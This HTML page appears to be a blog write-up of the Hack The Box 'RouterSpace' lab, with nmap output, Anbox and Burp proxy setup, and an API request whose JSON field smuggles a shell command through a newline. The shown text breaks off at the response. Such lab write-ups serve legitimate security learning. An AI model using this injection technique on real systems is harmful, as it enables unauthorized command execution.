<!doctype html><html lang=mn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - RouterSpace | CaDiL's Blog</title>
<meta name=keywords content="Writeup"><meta name=description content="HTB - RouterSpace - Writeup /Mostly Notes/"><meta name=author content="CaDiL"><link rel=canonical href=https://cadil.github.io/posts/2024-03-08-htb-routerspace-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://cadil.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://cadil.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://cadil.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://cadil.github.io/apple-touch-icon.png><link rel=mask-icon href=https://cadil.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=mn href=https://cadil.github.io/posts/2024-03-08-htb-routerspace-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HTB - RouterSpace"><meta property="og:description" content="HTB - RouterSpace - Writeup /Mostly Notes/"><meta property="og:type" content="article"><meta property="og:url" content="https://cadil.github.io/posts/2024-03-08-htb-routerspace-writeup/"><meta property="og:image" content="https://cadil.github.io/static"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-03-08T00:00:00+00:00"><meta property="article:modified_time" content="2024-03-08T00:00:00+00:00"><meta property="og:site_name" content="CaDiL's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://cadil.github.io/static"><meta name=twitter:title content="HTB - RouterSpace"><meta name=twitter:description content="HTB - RouterSpace - Writeup /Mostly Notes/"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://cadil.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - RouterSpace","item":"https://cadil.github.io/posts/2024-03-08-htb-routerspace-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - RouterSpace","name":"HTB - RouterSpace","description":"HTB - RouterSpace - Writeup /Mostly Notes/","keywords":["Writeup"],"articleBody":"1. IP Address # Machine Address 10.10.11.148 # Local Address 10.10.14.26 2. Nmap cli:\nnmap -sV -sC -oA nmap/routerspace 10.10.11.148 out:\n# Nmap 7.92 scan initiated Thu Mar 3 22:22:16 2022 as: nmap -sV -sC -oA nmap/routerspace 10.10.11.148 Nmap scan report for 10.10.11.148 Host is up (0.24s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-RouterSpace Packet Filtering V1 | ssh-hostkey: | 3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA) | 256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA) |_ 256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519) 80/tcp open http | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-92794 | Content-Type: text/html; charset=utf-8 | Content-Length: 68 | ETag: W/\"44-YTg+YKRarDkwjuDFBsGeCy28pkI\" | Date: Fri, 04 Mar 2022 03:22:44 GMT | Connection: close | Suspicious activity detected !!! {RequestID: jfx F7 pDjf O gp } | GetRequest: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-89278 | Accept-Ranges: bytes | Cache-Control: public, max-age=0 | Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT | ETag: W/\"652c-17d476c9285\" | Content-Type: text/html; charset=UTF-8 | Content-Length: 25900 | Date: Fri, 04 Mar 2022 03:22:42 GMT | Connection: close | \u003c!doctype html\u003e | ","wordCount":"821","inLanguage":"mn","datePublished":"2024-03-08T00:00:00Z","dateModified":"2024-03-08T00:00:00Z","author":{"@type":"Person","name":"CaDiL"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://cadil.github.io/posts/2024-03-08-htb-routerspace-writeup/"},"publisher":{"@type":"Organization","name":"CaDiL's Blog","logo":{"@type":"ImageObject","url":"https://cadil.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://cadil.github.io/ accesskey=h title="CaDiL's Blog (Alt + H)">CaDiL's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://cadil.github.io/archives/ title=Archive><span>Archive</span></a></li><li><a href=https://cadil.github.io/bookmark/ title=Bookmark><span>Bookmark</span></a></li><li><a href=https://cadil.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://cadil.github.io/>Нүүр</a>&nbsp;»&nbsp;<a href=https://cadil.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">HTB - RouterSpace</h1><div class=post-description>HTB - RouterSpace - Writeup /Mostly Notes/</div><div class=post-meta><span title='2024-03-08 00:00:00 +0000 UTC'>гуравдугаар сар 8, 2024</span>&nbsp;·&nbsp;4 МИН&nbsp;·&nbsp;CaDiL</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Агуулга</span></summary><div class=inner><ul><li><a href=#1-ip-address aria-label="1. IP Address">1. IP Address</a></li><li><a href=#2-nmap aria-label="2. Nmap">2. Nmap</a></li><li><a href=#3-anbox aria-label="3. Anbox">3. Anbox</a></li><li><a href=#4-ssh aria-label="4. SSH">4. SSH</a></li><li><a href=#5-privilege-escalation aria-label="5. Privilege escalation">5. Privilege escalation</a><ul><li><a href=#51-linpeas aria-label="5.1 linpeas">5.1 linpeas</a></li><li><a href=#52-cve-2021-3156 aria-label="5.2 CVE-2021-3156">5.2 CVE-2021-3156</a></li></ul></li></ul></div></details></div><div class=post-content><h3 id=1-ip-address>1. IP Address<a hidden class=anchor aria-hidden=true href=#1-ip-address>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Machine Address</span>
</span></span><span style=display:flex><span>10.10.11.148
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Local Address</span>
</span></span><span style=display:flex><span>10.10.14.26
</span></span></code></pre></div><h3 id=2-nmap>2. Nmap<a hidden class=anchor aria-hidden=true href=#2-nmap>#</a></h3><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -sV -sC -oA nmap/routerspace 10.10.11.148
</span></span></code></pre></div><p>out:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Nmap 7.92 scan initiated Thu Mar  3 22:22:16 2022 as: nmap -sV -sC -oA nmap/routerspace 10.10.11.148</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.148
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.24s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> filtered tcp ports <span style=color:#f92672>(</span>no-response<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| fingerprint-strings: 
</span></span><span style=display:flex><span>|   NULL: 
</span></span><span style=display:flex><span>|_    SSH-2.0-RouterSpace Packet Filtering V1
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>3072</span> f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http
</span></span><span style=display:flex><span>| fingerprint-strings: 
</span></span><span style=display:flex><span>|   FourOhFourRequest: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>|     X-Powered-By: RouterSpace
</span></span><span style=display:flex><span>|     X-Cdn: RouterSpace-92794
</span></span><span style=display:flex><span>|     Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#ae81ff>68</span>
</span></span><span style=display:flex><span>|     ETag: W/<span style=color:#e6db74>&#34;44-YTg+YKRarDkwjuDFBsGeCy28pkI&#34;</span>
</span></span><span style=display:flex><span>|     Date: Fri, <span style=color:#ae81ff>04</span> Mar <span style=color:#ae81ff>2022</span> 03:22:44 GMT
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     Suspicious activity detected !!! <span style=color:#f92672>{</span>RequestID: jfx F7 pDjf O gp <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>|   GetRequest: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>|     X-Powered-By: RouterSpace
</span></span><span style=display:flex><span>|     X-Cdn: RouterSpace-89278
</span></span><span style=display:flex><span>|     Accept-Ranges: bytes
</span></span><span style=display:flex><span>|     Cache-Control: public, max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>|     Last-Modified: Mon, <span style=color:#ae81ff>22</span> Nov <span style=color:#ae81ff>2021</span> 11:33:57 GMT
</span></span><span style=display:flex><span>|     ETag: W/<span style=color:#e6db74>&#34;652c-17d476c9285&#34;</span>
</span></span><span style=display:flex><span>|     Content-Type: text/html; charset<span style=color:#f92672>=</span>UTF-8
</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#ae81ff>25900</span>
</span></span><span style=display:flex><span>|     Date: Fri, <span style=color:#ae81ff>04</span> Mar <span style=color:#ae81ff>2022</span> 03:22:42 GMT
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     &lt;!doctype html&gt;
</span></span><span style=display:flex><span>|     &lt;html class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;no-js&#34;</span> lang<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;zxx&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;head&gt;
</span></span><span style=display:flex><span>|     &lt;meta charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;utf-8&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;meta http-equiv<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;x-ua-compatible&#34;</span> content<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ie=edge&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;RouterSpace&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;meta name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;description&#34;</span> content<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;meta name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;viewport&#34;</span> content<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;width=device-width, initial-scale=1&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;css/bootstrap.min.css&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;css/owl.carousel.min.css&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;css/magnific-popup.css&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;css/font-awesome.min.css&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;css/themify-icons.css&#34;</span>&gt;
</span></span><span style=display:flex><span>|   HTTPOptions: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>|     X-Powered-By: RouterSpace
</span></span><span style=display:flex><span>|     X-Cdn: RouterSpace-67896
</span></span><span style=display:flex><span>|     Allow: GET,HEAD,POST
</span></span><span style=display:flex><span>|     Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#ae81ff>13</span>
</span></span><span style=display:flex><span>|     ETag: W/<span style=color:#e6db74>&#34;d-bMedpZYGrVt1nR4x+qdNZ2GqyRo&#34;</span>
</span></span><span style=display:flex><span>|     Date: Fri, <span style=color:#ae81ff>04</span> Mar <span style=color:#ae81ff>2022</span> 03:22:42 GMT
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     GET,HEAD,POST
</span></span><span style=display:flex><span>|   RTSPRequest, X11Probe: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#ae81ff>400</span> Bad Request
</span></span><span style=display:flex><span>|_    Connection: close
</span></span><span style=display:flex><span>|_http-title: RouterSpace
</span></span><span style=display:flex><span>|_http-trane-info: Problem with XML parsing of /evox/about
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style=display:flex><span><span style=color:#f92672>==============</span>NEXT SERVICE FINGERPRINT <span style=color:#f92672>(</span>SUBMIT INDIVIDUALLY<span style=color:#f92672>)==============</span>
</span></span><span style=display:flex><span>SF-Port22-TCP:V<span style=color:#f92672>=</span>7.92%I<span style=color:#f92672>=</span>7%D<span style=color:#f92672>=</span>3/3%Time<span style=color:#f92672>=</span>622185FF%P<span style=color:#f92672>=</span>x86_64-pc-linux-gnu%r<span style=color:#f92672>(</span>NULL,
</span></span><span style=display:flex><span>SF:29,<span style=color:#e6db74>&#34;SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>==============</span>NEXT SERVICE FINGERPRINT <span style=color:#f92672>(</span>SUBMIT INDIVIDUALLY<span style=color:#f92672>)==============</span>
</span></span><span style=display:flex><span>SF-Port80-TCP:V<span style=color:#f92672>=</span>7.92%I<span style=color:#f92672>=</span>7%D<span style=color:#f92672>=</span>3/3%Time<span style=color:#f92672>=</span>622185FF%P<span style=color:#f92672>=</span>x86_64-pc-linux-gnu%r<span style=color:#f92672>(</span>GetRe
</span></span><span style=display:flex><span>SF:quest,31BA,<span style=color:#e6db74>&#34;HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:-Cdn:\x20RouterSpace-89278\r\nAccept-Ranges:\x20bytes\r\nCache-Control:
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\x20public,\x20max-age=0\r\nLast-Modified:\x20Mon,\x2022\x20Nov\x202021
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\x2011:33:57\x20GMT\r\nETag:\x20W/\&#34;652c-17d476c9285\&#34;\r\nContent-Type:
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2025900\r\nDate:\x2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:0Fri,\x2004\x20Mar\x202022\x2003:22:42\x20GMT\r\nConnection:\x20close\r
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20class=\&#34;no-js\&#34;\x20lang=\&#34;zxx\&#34;&gt;\n&lt;h
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:ead&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;\n\x20\x20\x20\x20&lt;met
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:a\x20http-equiv=\&#34;x-ua-compatible\&#34;\x20content=\&#34;ie=edge\&#34;&gt;\n\x20\x20\x
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:20\x20&lt;title&gt;RouterSpace&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\&#34;descr
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:iption\&#34;\x20content=\&#34;\&#34;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\&#34;viewport\&#34;\x
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:20content=\&#34;width=device-width,\x20initial-scale=1\&#34;&gt;\n\n\x20\x20\x20\x
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;css/bootstrap\.min\.css\&#34;&gt;\n\x2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:0\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;css/owl\.carousel\.m
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:in\.css\&#34;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;css/m
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:agnific-popup\.css\&#34;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20h
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:ref=\&#34;css/font-awesome\.min\.css\&#34;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;sty
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:lesheet\&#34;\x20href=\&#34;css/themify-icons\.css\&#34;&gt;\n\x20&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>HTTPOptions,108
</span></span><span style=display:flex><span>SF:,<span style=color:#e6db74>&#34;HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX-Cdn:\x20R
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:outerSpace-67896\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x20text/ht
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:ml;\x20charset=utf-8\r\nContent-Length:\x2013\r\nETag:\x20W/\&#34;d-bMedpZY
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:GrVt1nR4x\+qdNZ2GqyRo\&#34;\r\nDate:\x20Fri,\x2004\x20Mar\x202022\x2003:22:
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:42\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>RTSPRequest,
</span></span><span style=display:flex><span>SF:2F,<span style=color:#e6db74>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&#34;</span>
</span></span><span style=display:flex><span>SF:<span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>X11Probe,2F,<span style=color:#e6db74>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20c
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:lose\r\n\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>FourOhFourRequest,12A,<span style=color:#e6db74>&#34;HTTP/1\.1\x20200\x20OK\r\nX-Pow
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:ered-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-92794\r\nContent-Type:
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2068\r\nETag:\x20W/
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\&#34;44-YTg\+YKRarDkwjuDFBsGeCy28pkI\&#34;\r\nDate:\x20Fri,\x2004\x20Mar\x2020
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:22\x2003:22:44\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\x20acti
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:vity\x20detected\x20!!!\x20{RequestID:\x20\x20jfx\x20F7\x20\x20\x20pDjf
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\x20O\x20\x20gp\x20}\n&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span><span style=color:#75715e># Nmap done at Thu Mar  3 22:23:06 2022 -- 1 IP address (1 host up) scanned in 50.74 seconds</span>
</span></span></code></pre></div><h3 id=3-anbox>3. Anbox<a hidden class=anchor aria-hidden=true href=#3-anbox>#</a></h3><p>Anbox суулгах:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo apt install dkms linux-headers-amd64
</span></span><span style=display:flex><span>git clone https://github.com/anbox/anbox-modules.git
</span></span><span style=display:flex><span>sudo snap install --devmode --edge anbox
</span></span><span style=display:flex><span>sudo snap refresh --edge --devmode anbox
</span></span><span style=display:flex><span>sudo apt install android-tools-adb
</span></span><span style=display:flex><span>sudo modprobe ashmem_linux <span style=color:#f92672>&amp;&amp;</span> sudo modprobe binder_linux
</span></span><span style=display:flex><span><span style=color:#75715e># s -1 /dev/{ashmem,binder}</span>
</span></span></code></pre></div><p>parrot дээр ажиллахгүй байна. Debug хийвэл package -р суулгаж байх үед image.img -г <code>/var/lib/anbox</code> дотор суулгаж өгөөгүй байсан.
<a href=https://build.anbox.io/android-images>https://build.anbox.io/android-images</a> - ороод image татаж аваад reboot хийхэд хэвийн ажиллаж эхэлсэн.
cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>adb install RouterSpace.apk
</span></span></code></pre></div><p><figure><img loading=lazy src=/images/routerspace_post_image_1.png></figure><code>Anbox</code>, network нь холбогдоогүй болохоор check router дарахаар connection failed болоод байна.
clI:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo systemctl restart snap.anbox.container-manager.service
</span></span></code></pre></div><p>andbox -г restart хийгээд github-с anbox-birdige.sh ажилуулсан. ip addr дотор дараах утгатай bridge үүсгэсэн.
out:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>4: anbox0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span style=color:#ae81ff>1500</span> qdisc noqueue state UP group default qlen <span style=color:#ae81ff>1000</span>
</span></span><span style=display:flex><span>    link/ether fe:65:a2:6c:8b:c1 brd ff:ff:ff:ff:ff:ff
</span></span><span style=display:flex><span>    inet 192.168.250.1/24 scope global anbox0
</span></span><span style=display:flex><span>       valid_lft forever preferred_lft forever
</span></span><span style=display:flex><span>    inet6 fe80::44cf:6bff:fee8:5819/64 scope link 
</span></span><span style=display:flex><span>       valid_lft forever preferred_lft foreve
</span></span></code></pre></div><p>Тэгээд бас холбогдохгүй байсан. VM -г гараад network -гоо <code>Bridge Connection</code> болгоод дахин үзсэн. Болсон
cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>adb shell settings put global http_proxy 10.10.14.4:8001
</span></span></code></pre></div><p>burp холбох:<figure><img loading=lazy src=/images/routerspace_post_image_2.png></figure>Burp дээр дараах тохиргоог хийнэ.<figure><img loading=lazy src=/images/routerspace_post_image_3.png></figure>Хүсэлт авч байгааг харж байна.</p><p>Доорх хаягаар хүсэлт явуулахаар болохгүй байна.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
</span></span><span style=display:flex><span>accept: application/json, text/plain, */*
</span></span><span style=display:flex><span>user-agent: RouterSpaceAgent
</span></span><span style=display:flex><span>Content-Type: application/json
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>14</span>
</span></span><span style=display:flex><span>Host: routerspace.htb
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;ip&#34;</span>:<span style=color:#e6db74>&#34;id&#34;</span><span style=color:#f92672>}</span>   
</span></span></code></pre></div><p><code>\n</code> урд нь бичээд үзвэл</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
</span></span><span style=display:flex><span>accept: application/json, text/plain, */*
</span></span><span style=display:flex><span>user-agent: RouterSpaceAgent
</span></span><span style=display:flex><span>Content-Type: application/json
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>16</span>
</span></span><span style=display:flex><span>Host: routerspace.htb
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;ip&#34;</span>:<span style=color:#e6db74>&#34;\nid&#34;</span><span style=color:#f92672>}</span>   
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>###</span>
</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>X-Powered-By: RouterSpace
</span></span><span style=display:flex><span>X-Cdn: RouterSpace-93305
</span></span><span style=display:flex><span>Content-Type: application/json; charset<span style=color:#f92672>=</span>utf-8
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>53</span>
